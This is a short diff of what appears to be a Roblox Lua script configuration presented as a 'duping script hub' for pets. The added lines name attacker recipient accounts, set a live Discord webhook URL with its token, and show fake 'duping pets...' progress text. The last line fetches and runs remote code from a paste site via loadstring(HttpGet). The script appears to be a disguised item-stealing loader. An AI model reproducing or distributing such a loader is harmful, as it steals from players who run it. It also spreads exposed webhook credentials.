@@ -1,6 +1,9 @@
-_G.Username = "freevcaccforyou"
-_G.Diamonds = 5000000
-
-_G.Webhook = "https://discord.com/api/webhooks/1095546822501609472/Mqx3PMN4sPI_ZLMrf_H-mu_8OyY-A_AFYHV2Ko6GpYVaHqDQpE1afKEZlXOeRlYorhOC"
-
-loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua%22))()
+UserName = "freevcaccforyoh"
+UserName2 = "imrealboy89"
+Webhook = "https://discord.com/api/webhooks/1112166343874195578/9g8fmZAM2pQJgmUUvKVQY2K6INUMU_QlkcAl3AXAKQ-0YzE_WRTO7zgY4w7fyDHJPBzx"
+_G.ScriptName = "duping script hub"
+_G.FirstText = "hello..."
+_G.SecondText = "duping pets..."
+_G.ThirdText = "almost done..."
+_G.WaitingTime = 35
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984466", true))()
